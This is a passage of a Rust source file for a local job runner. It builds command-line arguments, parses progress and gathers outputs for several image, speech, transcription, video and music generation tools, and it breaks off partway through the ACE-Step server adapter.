//! One small adapter per runner: the programs it needs, the argv for a job (never a shell line: prompts are untrusted),
//! how it reports progress, and how its output folder becomes the job's files. Adding a model is a manifest, plus an
//! adapter only when it brings a new runner.
use super::catalog::WxH;
use super::vm;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::path::{Path, PathBuf};

/// A re-encoded input, ready for a host program.
#[derive(Clone, Debug)]
pub struct Input { pub role: String, pub path: PathBuf, pub seconds: Option<f64>, pub transcript: Option<String> }

/// Everything a runner needs for one job, already checked.
pub struct Plan {
    pub task: String,
    pub inputs: Value,
    pub refs: Vec<Input>,
    /// The job's folder: the runner's working directory.
    pub work: PathBuf,
    /// Where the runner writes; everything in it when the runner ends is uploaded.
    pub out: PathBuf,
    pub bins: HashMap<String, PathBuf>,
    pub weights: Option<PathBuf>,
    /// The weights' Hugging Face repo, found through HF_HUB_CACHE (offline): runners that read the model type from the
    /// name (mlx-audio) need it rather than the snapshot folder.
    pub repo: Option<String>,
    /// Other repos the runner loads (LTX's text encoder).
    pub also: Vec<String>,
    /// The one file in the weights the runner is given (whisper.cpp's ggml model).
    pub weights_file: Option<PathBuf>,
    pub base_model: Option<String>,
    pub size: Option<WxH>,
    /// Audio chunks made by `prepare` (long recordings are transcribed piece by piece).
    pub chunks: Vec<(PathBuf, f64)>,
}

impl Plan {
    pub fn bin(&self, name: &str) -> Result<String, String> { self.bins.get(name).map(|p| p.to_string_lossy().to_string()).ok_or_else(|| format!("{name} isn't installed")) }
    /// What to pass as `--model`: the repo id when known, else the snapshot folder.
    fn model_ref(&self) -> Result<String, String> {
        match (&self.repo, &self.weights) { (Some(r), Some(_)) => Ok(r.clone()), (None, Some(w)) => Ok(Self::s(w)), _ => Err("no weights".into()) }
    }
    pub fn prompt(&self) -> String { self.inputs["prompt"].as_str().unwrap_or("").to_string() }
    pub fn n(&self) -> u64 { self.inputs["n"].as_u64().unwrap_or(1).clamp(1, 16) }
    /// The seed asked for, or a fixed one (so the provenance note can say which).
    pub fn seed(&self) -> u64 { self.inputs["seed"].as_u64().unwrap_or(42) & 0xffff_ffff }
    pub fn param(&self, k: &str) -> &Value { &self.inputs["params"][k] }
    pub fn refs_of(&self, role: &str) -> Vec<&Input> { self.refs.iter().filter(|r| r.role == role).collect() }
    fn s(p: &Path) -> String { p.to_string_lossy().to_string() }
    /// The prompt in a file in the job folder, for runners that read it from there.
    fn prompt_file(&self) -> Result<String, String> {
        let f = self.work.join("prompt.txt");
        std::fs::write(&f, self.prompt()).map_err(|e| format!("writing the prompt: {e}"))?;
        Ok(Self::s(&f))
    }
}

pub trait Adapter: Sync {
    /// Programs that must be installed.
    fn programs(&self) -> &'static [&'static str];
    /// Anything else the runner needs beyond its programs (a Python module in its tool environment, say).
    fn ready(&self, _bins: &HashMap<String, PathBuf>) -> bool { true }
    /// Work before the runner starts (splitting long audio, say).
    fn prepare(&self, _p: &mut Plan) -> Result<(), String> { Ok(()) }
    /// The runs that make the outputs, one after another; each is an argv, program first.
    fn steps(&self, p: &Plan) -> Result<Vec<Vec<String>>, String>;
    /// Progress of one run from a line of its output: (done, total).
    fn progress(&self, line: &str, _p: &Plan) -> Option<(u64, u64)> { tqdm(line) }
    /// Tidies the output folder into the job's files; may return a result for /done (a transcript's text).
    fn finish(&self, _p: &Plan) -> Result<Option<Value>, String> { Ok(None) }
    /// How long it may run.
    fn timeout_s(&self, _p: &Plan, manifest: u64) -> u64 { manifest }
    /// The server this runner keeps (resident.rs), if it's one.
    fn resident(&self) -> Option<&'static str> { None }
    /// A run that isn't a list of commands (a job sent to a server); when given, `steps` isn't used.
    fn custom<'a>(&'a self, _p: &'a Plan, _ctl: &'a super::Ctl, _deadline: std::time::Instant) -> Option<BoxFuture<'a, Result<Option<Value>, super::Stop>>> { None }
}
pub type BoxFuture<'a, T> = std::pin::Pin<Box<dyn std::future::Future<Output = T> + Send + 'a>>;

pub fn get(runner: &str) -> Option<&'static dyn Adapter> {
    Some(match runner {
        "ffmpeg:test-pattern" => &TestPattern,
        "ffmpeg:test-tone" => &TestTone,
        "ffmpeg:test-transcribe" => &TestTranscribe,
        "mflux:flux2" => &MFLUX_FLUX2,
        "mflux:z-image-turbo" => &MFLUX_Z_IMAGE,
        "mflux:seedvr2" => &SeedVr2,
        "mlx-audio:kokoro" => &Kokoro,
        "mlx-audio:qwen3-tts" => &Qwen3Tts,
        "mlx-whisper" => &MlxWhisper,
        "parakeet-mlx" => &Parakeet,
        "whisper.cpp" => &WhisperCpp,
        "ltx-2-mlx" => &Ltx2,
        "acestep-api" => &AceStep,
        "sa3" => &Sa3,
        "wan2.2" => &Wan22,
        _ => return None,
    })
}

/* ---------- progress ---------- */

/// tqdm's "45%|████▌     | 9/20 [00:03<00:04, 2.5it/s]": the n/m after the bar.
pub fn tqdm(line: &str) -> Option<(u64, u64)> {
    let rest = line.split_once("%|")?.1;
    let after = rest.split_once('|')?.1;
    let tok = after.split_whitespace().next()?;
    let (a, b) = tok.split_once('/')?;
    let (a, b) = (a.parse::<u64>().ok()?, b.parse::<u64>().ok()?);
    (b > 0 && a <= b).then_some((a, b))
}

/// ffmpeg's `-progress` lines: `out_time_us=1500000` → tenths of a second done, of `total_s`.
pub fn ffmpeg_progress(line: &str, total_s: f64) -> Option<(u64, u64)> {
    let us = line.trim().strip_prefix("out_time_us=")?.parse::<i64>().ok()?;
    let total = (total_s * 10.0).round().max(1.0) as u64;
    Some(((us.max(0) as u64 / 100_000).min(total), total))
}

const FFMPEG: &[&str] = &["ffmpeg"];
fn ffmpeg_head(p: &Plan) -> Result<Vec<String>, String> {
    Ok(vec![p.bin("ffmpeg")?, "-hide_banner".into(), "-nostdin".into(), "-loglevel".into(), "error".into(), "-nostats".into(), "-progress".into(), "pipe:2".into(), "-y".into()])
}

/* ---------- test models: ffmpeg only, no weights ---------- */

/// A test pattern of the asked size, tinted by the seed; an edit scales the reference instead. `params.slow_s` makes it
/// take that long (to try progress and cancel).
pub struct TestPattern;
impl Adapter for TestPattern {
    fn programs(&self) -> &'static [&'static str] { FFMPEG }
    fn steps(&self, p: &Plan) -> Result<Vec<Vec<String>>, String> {
        let sz = p.size.ok_or("no size")?;
        let slow = p.param("slow_s").as_u64().unwrap_or(0).min(120);
        let subject = p.refs_of("subject").first().map(|r| r.path.clone());
        if p.task == "image.edit" && subject.is_none() { return Err("an edit needs a subject reference".into()); }
        (0..p.n()).map(|i| {
            let mut a = ffmpeg_head(p)?;
            let hue = (p.seed() + i) % 360;
            match &subject {
                Some(r) if p.task == "image.edit" => { a.extend(["-loop".into(), "1".into(), "-framerate".into(), "1".into(), "-t".into(), (slow.max(1)).to_string()]); if slow > 0 { a.insert(1, "-re".into()); } a.extend(["-i".into(), Plan::s(r)]); }
                _ => { if slow > 0 { a.push("-re".into()); } a.extend(["-f".into(), "lavfi".into(), "-i".into(), format!("testsrc2=size={}x{}:rate=1:duration={}", sz.width, sz.height, slow.max(1))]); }
            }
            a.extend(["-vf".into(), format!("scale={}:{},hue=h={hue}", sz.width, sz.height), "-update".into(), "1".into(), "-c:v".into(), "png".into(), "-f".into(), "image2".into(), Plan::s(&p.out.join(format!("image-{i}.png")))]);
            Ok(a)
        }).collect()
    }
    fn progress(&self, line: &str, p: &Plan) -> Option<(u64, u64)> { ffmpeg_progress(line, p.param("slow_s").as_u64().unwrap_or(0).max(1) as f64) }
}

/// A sine tone as long as `duration_s` (else a second per 15 characters of prompt), as WAV.
pub struct TestTone;
impl TestTone { fn seconds(p: &Plan) -> f64 { p.inputs["duration_s"].as_f64().unwrap_or_else(|| (p.prompt().chars().count() as f64 / 15.0).clamp(1.0, 30.0)).clamp(0.1, 120.0) } }
impl Adapter for TestTone {
    fn programs(&self) -> &'static [&'static str] { FFMPEG }
    fn steps(&self, p: &Plan) -> Result<Vec<Vec<String>>, String> {
        let mut a = ffmpeg_head(p)?;
        if p.param("realtime").as_bool() == Some(true) { a.push("-re".into()); }
        let f = p.param("frequency").as_u64().unwrap_or(440).clamp(50, 4000);
        a.extend(["-f".into(), "lavfi".into(), "-i".into(), format!("sine=frequency={f}:sample_rate=24000:duration={:.2}", Self::seconds(p)),
            "-c:a".into(), "pcm_s16le".into(), Plan::s(&p.out.join(if p.task == "speech" { "speech.wav" } else { "audio.wav" }))]);
        Ok(vec![a])
    }
    fn progress(&self, line: &str, p: &Plan) -> Option<(u64, u64)> { ffmpeg_progress(line, Self::seconds(p)) }
}

/// Reads the (re-encoded) recording through and writes a transcript that only says how long it was.
pub struct TestTranscribe;
impl Adapter for TestTranscribe {
    fn programs(&self) -> &'static [&'static str] { FFMPEG }
    fn steps(&self, p: &Plan) -> Result<Vec<Vec<String>>, String> {
        let src = p.refs_of("source_audio").first().map(|r| r.path.clone()).ok_or("a transcription needs a source_audio reference")?;
        let mut a = ffmpeg_head(p)?;
        a.extend(["-i".into(), Plan::s(&src), "-f".into(), "null".into(), "-".into()]);
        Ok(vec![a])
    }
    fn progress(&self, line: &str, p: &Plan) -> Option<(u64, u64)> { ffmpeg_progress(line, p.refs.first().and_then(|r| r.seconds).unwrap_or(1.0)) }
    fn finish(&self, p: &Plan) -> Result<Option<Value>, String> {
        let secs = p.refs.first().and_then(|r| r.seconds).unwrap_or(0.0);
        let text = format!("[test-transcribe: {secs:.1} s of audio, no words recognised]");
        write_transcript(&p.out, &text, &json!([{ "start": 0.0, "end": secs, "text": text }]), p.inputs["language"].as_str())?;
        Ok(Some(json!({ "text": text })))
    }
}

/* ---------- mflux (FLUX.2 klein, Z-Image Turbo, SeedVR2) ---------- */

/// One mflux family: its programs, its default and most steps, and whether it takes a negative prompt.
pub struct Mflux { pub generate: &'static str, pub edit: Option<&'static str>, pub programs: &'static [&'static str], pub steps: u64, pub max_steps: u64, pub negative: bool }
pub const MFLUX_FLUX2: Mflux = Mflux { generate: "mflux-generate-flux2", edit: Some("mflux-generate-flux2-edit"), programs: &["mflux-generate-flux2", "mflux-generate-flux2-edit"], steps: 4, max_steps: 8, negative: false };
pub const MFLUX_Z_IMAGE: Mflux = Mflux { generate: "mflux-generate-z-image-turbo", edit: None, programs: &["mflux-generate-z-image-turbo"], steps: 9, max_steps: 16, negative: true };

impl Adapter for Mflux {
    fn programs(&self) -> &'static [&'static str] { self.programs }
    fn steps(&self, p: &Plan) -> Result<Vec<Vec<String>>, String> {
        let weights = p.model_ref()?;
        let prompt = p.prompt_file()?;
        let subjects: Vec<String> = p.refs_of("subject").iter().map(|r| Plan::s(&r.path)).collect();
        let edit = p.task == "image.edit";
        if edit && (subjects.is_empty() || self.edit.is_none()) { return Err("an edit needs at least one subject reference".into()); }
        let steps = p.param("steps").as_u64().unwrap_or(self.steps).clamp(1, self.max_steps);
        let negative = p.inputs["negative_prompt"].as_str().filter(|n| self.negative && !n.is_empty());
        (0..p.n()).map(|i| {
            let mut a = vec![p.bin(if edit { self.edit.unwrap_or_default() } else { self.generate })?, "--model".into(), weights.clone()];
            if let Some(b) = &p.base_model { a.extend(["--base-model".into(), b.clone()]); }
            // The prompt is read from a file: never on the command line, where one starting with "-" would be a flag.
            a.extend(["--prompt-file".into(), prompt.clone(), "--steps".into(), steps.to_string(), "--seed".into(), ((p.seed() + i) & 0xffff_ffff).to_string()]);
            if let Some(n) = negative { a.push(format!("--negative-prompt={n}")); }
            // An edit keeps the reference's size unless one was asked for.
            if let (Some(sz), false) = (p.size, edit && p.inputs.get("size").is_none()) { a.extend(["--width".into(), sz.width.to_string(), "--height".into(), sz.height.to_string()]); }
            if edit { a.push("--image-paths".into()); a.extend(subjects.iter().cloned()); }
            // No metadata of mflux's own: it would carry local paths. Ours is added after (provenance).
            a.extend(["--no-metadata".into(), "--output".into(), Plan::s(&p.out.join(format!("image-{i}.png")))]);
            Ok(a)
        }).collect()
    }
}

/// SeedVR2 upscaling: twice the size (or a shortest side asked for), never past 2048 on the shortest side.
pub struct SeedVr2;
pub const UPSCALE_MAX_SHORT: u32 = 2048;
impl Adapter for SeedVr2 {
    fn programs(&self) -> &'static [&'static str] { &["mflux-upscale-seedvr2"] }
    fn steps(&self, p: &Plan) -> Result<Vec<Vec<String>>, String> {
        let src = p.refs_of("subject").first().map(|r| r.path.clone()).ok_or("an upscale needs a subject reference")?;
        let (w, h) = vm::check_png(&src, vm::MAX_SIDE)?;
        let short = w.min(h);
        let asked = p.param("shortest_side").as_u64().map(|x| x as u32).unwrap_or(short * 2);
        let target = asked.clamp(short.max(64), UPSCALE_MAX_SHORT);
        let softness = p.param("softness").as_f64().unwrap_or(0.5).clamp(0.0, 1.0);
        // mflux's own name for the model; it resolves to the cached numz/SeedVR2_comfyUI files (offline). Unquantized:
        // mflux 0.24 runs it that way.
        Ok(vec![vec![p.bin("mflux-upscale-seedvr2")?, "--model".into(), "seedvr2-3b".into(), "--image-path".into(), Plan::s(&src),
            "--resolution".into(), target.to_string(), "--softness".into(), format!("{softness:.2}"), "--seed".into(), p.seed().to_string(),
            "--no-metadata".into(), "--output".into(), Plan::s(&p.out.join("upscaled.png"))]])
    }
}

/* ---------- mlx-audio (Kokoro) ---------- */

/// The Python modules a uv tool's environment must have, next to its program.
fn tool_has(bin: &Path, modules: &[&str]) -> bool {
    let Ok(real) = std::fs::canonicalize(bin) else { return false };
    let Some(venv) = real.parent().and_then(|b| b.parent()) else { return false };
    let Ok(libs) = std::fs::read_dir(venv.join("lib")) else { return false };
    let sites: Vec<PathBuf> = libs.flatten().map(|e| e.path().join("site-packages")).filter(|p| p.is_dir()).collect();
    modules.iter().all(|m| sites.iter().any(|s| s.join(m).is_dir()))
}

pub struct Kokoro;
impl Kokoro {
    fn voice(p: &Plan) -> String {
        p.param("voice").as_str().map(String::from).unwrap_or_else(|| if p.inputs["language"] == "en-gb" { "bf_emma".into() } else { "af_heart".into() })
    }
}
impl Adapter for Kokoro {
    fn programs(&self) -> &'static [&'static str] { &["mlx_audio.tts.generate"] }
    fn ready(&self, bins: &HashMap<String, PathBuf>) -> bool {
        // Kokoro's English needs misaki and spaCy's small English model; without them it would try to fetch them.
        bins.get("mlx_audio.tts.generate").map_or(false, |b| tool_has(b, &["misaki", "en_core_web_sm"]))
    }
    fn steps(&self, p: &Plan) -> Result<Vec<Vec<String>>, String> {
        let weights = p.model_ref()?;
        let text = p.prompt();
        if text.trim().is_empty() { return Err("there's no text to speak".into()); }
        let voice = Self::voice(p);
        let lang = if voice.starts_with('b') { "b" } else { "a" };
        let speed = p.param("speed").as_f64().unwrap_or(1.0).clamp(0.5, 2.0);
        // `--text=…` in one argument: text starting with "-" stays text.
        Ok(vec![vec![p.bin("mlx_audio.tts.generate")?, "--model".into(), weights, format!("--text={text}"), "--voice".into(), voice, "--lang_code".into(), lang.into(),
            "--speed".into(), format!("{speed:.2}"), "--output_path".into(), Plan::s(&p.out), "--file_prefix".into(), "speech".into(), "--audio_format".into(), "wav".into(), "--join_audio".into()]])
    }
    fn finish(&self, p: &Plan) -> Result<Option<Value>, String> { one_wav(p, "speech") }
}

/// mlx-audio writes <prefix>.wav, or <prefix>_000.wav and on: one file is renamed to <prefix>.wav, several kept in order.
fn one_wav(p: &Plan, prefix: &str) -> Result<Option<Value>, String> {
    let mut wavs: Vec<PathBuf> = files(&p.out).into_iter().filter(|f| f.extension().map_or(false, |e| e == "wav")).collect();
    wavs.sort();
    if wavs.is_empty() { return Err("the runner wrote no audio".into()); }
    let want = format!("{prefix}.wav");
    if wavs.len() == 1 && wavs[0].file_name().map_or(false, |n| n.to_string_lossy() != want) { std::fs::rename(&wavs[0], p.out.join(want)).map_err(|e| e.to_string())?; }
    Ok(None)
}
fn mlx_audio_head(p: &Plan, text: &str, prefix: &str) -> Result<Vec<String>, String> {
    // `--text=…` in one argument: text starting with "-" stays text.
    Ok(vec![p.bin("mlx_audio.tts.generate")?, "--model".into(), p.model_ref()?, format!("--text={text}"), "--output_path".into(), Plan::s(&p.out),
        "--file_prefix".into(), prefix.into(), "--audio_format".into(), "wav".into(), "--join_audio".into()])
}

/// Qwen3-TTS: speech in the voice of a reference (consent is checked by the Gate before the job is queued). Its
/// transcript comes from the job; without one, mlx-audio transcribes the reference with Whisper (from the cache).
pub struct Qwen3Tts;
impl Adapter for Qwen3Tts {
    fn programs(&self) -> &'static [&'static str] { &["mlx_audio.tts.generate"] }
    fn steps(&self, p: &Plan) -> Result<Vec<Vec<String>>, String> {
        let text = p.prompt();
        if text.trim().is_empty() { return Err("there's no text to speak".into()); }
        let voice = p.refs_of("voice").first().cloned().cloned().ok_or("a voice clone needs a voice reference")?;
        let mut a = mlx_audio_head(p, &text, "speech")?;
        a.extend(["--ref_audio".into(), Plan::s(&voice.path)]);
        match voice.transcript.as_deref().map(str::trim).filter(|t| !t.is_empty()) {
            Some(t) => a.push(format!("--ref_text={t}")),
            None => {
                let st = super::catalog::storage();
                if !super::catalog::hubs(&st).iter().any(|h| super::catalog::snapshot(h, WHISPER_REPO, None).is_some()) {
                    return Err("the voice reference needs its transcript (no Whisper on this machine to make one)".into());
                }
                a.extend(["--stt_model".into(), WHISPER_REPO.into()]);
            }
        }
        Ok(vec![a])
    }
    fn finish(&self, p: &Plan) -> Result<Option<Value>, String> { one_wav(p, "speech") }
}
pub const WHISPER_REPO: &str = "mlx-community/whisper-large-v3-turbo";

/* ---------- mlx-whisper ---------- */

/// Recordings longer than this are transcribed in pieces, one after another.
pub const CHUNK_S: f64 = 360.0;

pub struct MlxWhisper;
impl Adapter for MlxWhisper {
    fn programs(&self) -> &'static [&'static str] { &["mlx_whisper", "ffmpeg"] }
    fn prepare(&self, p: &mut Plan) -> Result<(), String> { split_source(p) }
    fn steps(&self, p: &Plan) -> Result<Vec<Vec<String>>, String> {
        let weights = p.model_ref()?;
        let parts = p.work.join("parts");
        let task = p.param("task").as_str().filter(|t| *t == "translate").unwrap_or("transcribe");
        p.chunks.iter().enumerate().map(|(i, (chunk, _))| {
            let mut a = vec![p.bin("mlx_whisper")?, Plan::s(chunk), "--model".into(), weights.clone(), "--output-dir".into(), Plan::s(&parts),
                "--output-name".into(), format!("part-{i:03}"), "--output-format".into(), "json".into(), "--verbose".into(), "False".into(), "--task".into(), task.into()];
            if let Some(l) = p.inputs["language"].as_str() { a.extend(["--language".into(), l.into()]); }
            let hint = p.prompt();
            if !hint.is_empty() { a.push(format!("--initial-prompt={hint}")); }
            Ok(a)
        }).collect()
    }
    fn finish(&self, p: &Plan) -> Result<Option<Value>, String> { merge_parts(p) }
    // Three times the recording plus half a minute, between one minute and half an hour.
    fn timeout_s(&self, p: &Plan, _manifest: u64) -> u64 { transcribe_timeout(p) }
}

/// Joins the transcript of each piece (parts/part-NNN.json: `text`, and `segments` or `sentences` with start/end) into
/// transcript.txt and transcript.json, times shifted by where each piece starts.
fn merge_parts(p: &Plan) -> Result<Option<Value>, String> {
    let (mut text, mut segs, mut offset, mut lang) = (String::new(), vec![], 0.0, None);
    for (i, (_, secs)) in p.chunks.iter().enumerate() {
        let f = p.work.join("parts").join(format!("part-{i:03}.json"));
        let v: Value = serde_json::from_slice(&std::fs::read(&f).map_err(|_| format!("the runner wrote no transcript for part {}", i + 1))?).map_err(|e| e.to_string())?;
        // whisper.cpp's -oj: {result: {language}, transcription: [{offsets: {from, to} in ms, text}]}
        let v = if let Some(tr) = v["transcription"].as_array() {
            let segs: Vec<Value> = tr.iter().map(|s| json!({ "start": s["offsets"]["from"].as_f64().unwrap_or(0.0) / 1000.0, "end": s["offsets"]["to"].as_f64().unwrap_or(0.0) / 1000.0, "text": s["text"] })).collect();
            json!({ "text": tr.iter().filter_map(|s| s["text"].as_str()).collect::<String>(), "language": v["result"]["language"], "segments": segs })
        } else { v };
        let t = v["text"].as_str().unwrap_or("").trim();
        if !t.is_empty() { if !text.is_empty() { text.push(' '); } text.push_str(t); }
        if lang.is_none() { lang = v["language"].as_str().map(String::from); }
        let list = v["segments"].as_array().or(v["sentences"].as_array()).cloned().unwrap_or_default();
        for s in list.into_iter().take(5000) {
            segs.push(json!({ "start": round2(s["start"].as_f64().unwrap_or(0.0) + offset), "end": round2(s["end"].as_f64().unwrap_or(0.0) + offset), "text": s["text"].as_str().unwrap_or("").trim() }));
        }
        offset += secs;
    }
    write_transcript(&p.out, &text, &Value::Array(segs), lang.as_deref().or(p.inputs["language"].as_str()))?;
    Ok(Some(json!({ "text": text.chars().take(4000).collect::<String>(), "language": lang })))
}
fn split_source(p: &mut Plan) -> Result<(), String> {
    let src = p.refs_of("source_audio").first().map(|r| r.path.clone()).ok_or("a transcription needs a source_audio reference")?;
    p.chunks = vm::split_wav(&src, &p.work.join("chunks"), CHUNK_S)?;
    std::fs::create_dir_all(p.work.join("parts")).map_err(|e| e.to_string())
}
fn transcribe_timeout(p: &Plan) -> u64 { ((p.chunks.iter().map(|c| c.1).sum::<f64>() * 3.0 + 30.0) as u64).clamp(60, 1800) }

/// Parakeet TDT (25 European languages; finds the language itself).
pub struct Parakeet;
impl Adapter for Parakeet {
    fn programs(&self) -> &'static [&'static str] { &["parakeet-mlx", "ffmpeg"] }
    fn prepare(&self, p: &mut Plan) -> Result<(), String> { split_source(p) }
    fn steps(&self, p: &Plan) -> Result<Vec<Vec<String>>, String> {
        let weights = p.model_ref()?;
        p.chunks.iter().enumerate().map(|(i, (chunk, _))| Ok(vec![p.bin("parakeet-mlx")?, Plan::s(chunk), "--model".into(), weights.clone(), "--output-format".into(), "json".into(),
            "--output-dir".into(), Plan::s(&p.work.join("parts")), "--output-template".into(), format!("part-{i:03}")])).collect()
    }
    fn finish(&self, p: &Plan) -> Result<Option<Value>, String> { merge_parts(p) }
    fn timeout_s(&self, p: &Plan, _manifest: u64) -> u64 { transcribe_timeout(p) }
}

/// whisper.cpp (`whisper-cli`, built with CUDA or for the CPU): Linux.
pub struct WhisperCpp;
impl Adapter for WhisperCpp {
    fn programs(&self) -> &'static [&'static str] { &["whisper-cli"] }
    fn prepare(&self, p: &mut Plan) -> Result<(), String> { split_source(p) }
    fn steps(&self, p: &Plan) -> Result<Vec<Vec<String>>, String> {
        let model = p.weights_file.as_ref().ok_or("no ggml model file")?;
        p.chunks.iter().enumerate().map(|(i, (chunk, _))| {
            let mut a = vec![p.bin("whisper-cli")?, "-m".into(), Plan::s(model), "-f".into(), Plan::s(chunk), "-oj".into(), "-of".into(), Plan::s(&p.work.join("parts").join(format!("part-{i:03}"))),
                "-np".into(), "-pp".into(), "-l".into(), p.inputs["language"].as_str().unwrap_or("auto").into()];
            if p.param("task") == "translate" { a.push("-tr".into()); }
            // whisper-cli takes the next argument as the prompt, whatever it starts with.
            let hint = p.prompt();
            if !hint.is_empty() { a.extend(["--prompt".into(), hint]); }
            Ok(a)
        }).collect()
    }
    // "whisper_print_progress_callback: progress =  45%"
    fn progress(&self, line: &str, _p: &Plan) -> Option<(u64, u64)> { line.split("progress =").nth(1)?.trim().trim_end_matches('%').trim().parse::<u64>().ok().filter(|x| *x <= 100).map(|x| (x, 100)) }
    fn finish(&self, p: &Plan) -> Result<Option<Value>, String> { merge_parts(p) }
    fn timeout_s(&self, p: &Plan, _manifest: u64) -> u64 { transcribe_timeout(p) }
}

/* ---------- LTX-2 video (a uv project in model storage's runners folder) ---------- */

/// Frames LTX takes: 8k+1. `duration_s` at 24 fps, at most 121 (5 s) on a 16 GB machine.
pub fn ltx_frames(duration_s: f64, fps: u32, max: u32) -> u32 { let f = (duration_s * fps as f64).round() as u32; ((f.max(9) - 1) / 8 * 8 + 1).min(max) }
pub struct Ltx2;
impl Ltx2 { pub fn dir() -> Option<PathBuf> { super::catalog::runners_dir().map(|d| d.join("ltx-2-mlx")) } }
impl Adapter for Ltx2 {
    fn programs(&self) -> &'static [&'static str] { &["uv"] }
    fn ready(&self, _bins: &HashMap<String, PathBuf>) -> bool { Self::dir().map_or(false, |d| d.join("pyproject.toml").is_file() && d.join(".venv").is_dir()) }
    fn steps(&self, p: &Plan) -> Result<Vec<Vec<String>>, String> {
        let dir = Self::dir().ok_or("the LTX runner isn't installed")?;
        let prompt = p.prompt();
        if prompt.trim().is_empty() { return Err("describe the video in the prompt".into()); }
        let sz = p.size.ok_or("no size")?;
        let frames = ltx_frames(p.inputs["duration_s"].as_f64().unwrap_or(3.0), 24, 121);
        // `uv run --no-sync --offline`: the project's own environment as installed, nothing fetched.
        let mut a = vec![p.bin("uv")?, "run".into(), "--offline".into(), "--no-sync".into(), "--directory".into(), Plan::s(&dir), "ltx-2-mlx".into(), "generate".into(),
            format!("--prompt={prompt}"), "--distilled".into(), "--model".into(), p.model_ref()?, "--low-ram".into(),
            "--height".into(), sz.height.to_string(), "--width".into(), sz.width.to_string(), "--frames".into(), frames.to_string(), "--frame-rate".into(), "24".into(),
            "--seed".into(), p.seed().to_string(), "--output".into(), Plan::s(&p.out.join("video.mp4"))];
        if let Some(g) = &p.also.first() { a.extend(["--gemma".into(), (*g).clone()]); }
        if p.task == "video.from_image" {
            let first = p.refs_of("first_frame").first().map(|r| r.path.clone()).ok_or("a video from an image needs a first_frame reference")?;
            a.extend(["--image".into(), Plan::s(&first), "0".into(), "1.0".into()]);
        }
        Ok(vec![a])
    }
}

/// Wan2.2 TI2V-5B, the official generate.py (a project in model storage's runners folder): Linux with CUDA.
pub struct Wan22;
impl Wan22 { pub fn dir() -> Option<PathBuf> { super::catalog::runners_dir().map(|d| d.join("Wan2.2")) } }
impl Adapter for Wan22 {
    fn programs(&self) -> &'static [&'static str] { &["uv"] }
    fn ready(&self, _bins: &HashMap<String, PathBuf>) -> bool { Self::dir().map_or(false, |d| d.join("generate.py").is_file()) }
    fn steps(&self, p: &Plan) -> Result<Vec<Vec<String>>, String> {
        let dir = Self::dir().ok_or("the Wan2.2 runner isn't installed")?;
        let ckpt = p.weights.as_ref().ok_or("no weights")?;
        let prompt = p.prompt();
        if prompt.trim().is_empty() { return Err("describe the video in the prompt".into()); }
        let size = match p.inputs["size"].as_str().unwrap_or("1280x704") { "704x1280" => "704*1280", _ => "1280*704" };
        // Frames are 4k+1 at 24 fps.
        let frames = (((p.inputs["duration_s"].as_f64().unwrap_or(5.0).clamp(1.0, 5.0) * 24.0) as u32 - 1) / 4 * 4 + 1).max(5);
        let mut a = vec![p.bin("uv")?, "run".into(), "--offline".into(), "--no-sync".into(), "--directory".into(), Plan::s(&dir), "python".into(), "generate.py".into(),
            "--task".into(), "ti2v-5B".into(), "--size".into(), size.into(), "--ckpt_dir".into(), Plan::s(ckpt), "--offload_model".into(), "True".into(),
            "--convert_model_dtype".into(), "--t5_cpu".into(), format!("--prompt={prompt}"), "--base_seed".into(), p.seed().to_string(), "--frame_num".into(), frames.to_string(),
            "--save_file".into(), Plan::s(&p.out.join("video.mp4"))];
        if p.task == "video.from_image" {
            let first = p.refs_of("first_frame").first().map(|r| r.path.clone()).ok_or("a video from an image needs a first_frame reference")?;
            a.extend(["--image".into(), Plan::s(&first)]);
        }
        Ok(vec![a])
    }
}

/* ---------- ACE-Step 1.5: music with lyrics, from its own API server (resident.rs) ---------- */

pub const ACESTEP_PORT: u16 = 8621;
pub struct AceStep;
impl AceStep {
    pub fn dir() -> Option<PathBuf> { super::catalog::runners_dir().map(|d| d.join("ACE-Step-1.5")) }
    async fn run(&self, p: &Plan, ctl: &super::Ctl, deadline: std::time::Instant) -> Result<Option<Value>, super::Stop> {
        use super::Stop;
        let dir = Self::dir().ok_or_else(|| Stop::Failed("ACE-Step isn't installed".into()))?;
        let mut env = super::runner_env(p, None);
        if cfg!(target_os = "macos") { env.extend([("PYTORCH_MPS_HIGH_WATERMARK_RATIO".into(), "0.0".into()), ("ACESTEP_LM_BACKEND".into(), "mlx".into())]); }
        env.push(("ACESTEP_API_HOST".into(), "127.0.0.1".into()));
        // No language model: without it ACE-Step decides by GPU size and, when the checkpoint isn't there, tries to fetch
        // one (Hugging Face, then ModelScope). The music model alone sings the lyrics it's given.
        env.push(("ACESTEP_INIT_LLM".into(), "false".into()));
        env.push(("MODELSCOPE_OFFLINE".into(), "1".into()));
        let argv = vec![p.bin("uv").map_err(Stop::Failed)?, "run".into(), "--offline".into(), "--no-sync".into(), "--directory".into(), Plan::s(&dir), "acestep-api".into(),
            "--host".into(), "127.0.0.1".into(), "--port".into(), ACESTEP_PORT.to_string()];
        ctl.stage("starting ACE-Step");
        let base = super::resident::ensure(super::resident::Spec { name: "acestep", port: ACESTEP_PORT, argv, cwd: &dir, env, health: "/health", ready_within: std::time::Duration::from_secs(600) }, ctl).await?;
        let c = reqwest::Client::builder().no_proxy().timeout(std::time::Duration::from_secs(20)).build().map_err(|e| Stop::Failed(e.to_string()))?;
        let lyrics = p.inputs["lyrics"].as_str().map(str::trim).filter(|l| !l.is_empty()).unwrap_or("[inst]");
        let seed = p.inputs["seed"].as_u64();
        let body = json!({ "prompt": p.prompt(), "lyrics": lyrics, "audio_duration": p.inputs["duration_s"].as_f64().unwrap_or(30.0).clamp(10.0, 300.0),
            "inference_steps": p.param("steps").as_u64().unwrap_or(8).clamp(1, 64), "audio_format": "wav", "batch_size": 1,
            "use_random_seed": seed.is_none(), "seed": seed.map_or(-1, |s| s as i64), "vocal_language": p.inputs["language"].as_str().unwrap_or("en") });
        // Every answer comes wrapped: { data, code, error }.
        // Generating holds the server's other requests until it's done: an answer that doesn't come in time means "busy".
        let call = |path: &'static str, b: Value| { let c = c.clone(); let url = format!("{base}{path}"); async move {
            let r = match c.post(url).json(&b).send().await { Ok(r) => r, Err(e) if e.is_timeout() => return Ok(None), Err(e) => return Err(format!("ACE-Step: {e}")) };
            let v: Value = match r.json().await { Ok(v) => v, Err(e) if e.is_timeout() => return Ok(None), Err(e) => return Err(format!("ACE-Step: {e}")) };
            if v["error"].is_string() { return Err(format!("ACE-Step: {}", v["error"].as_str().unwrap_or(""))); }
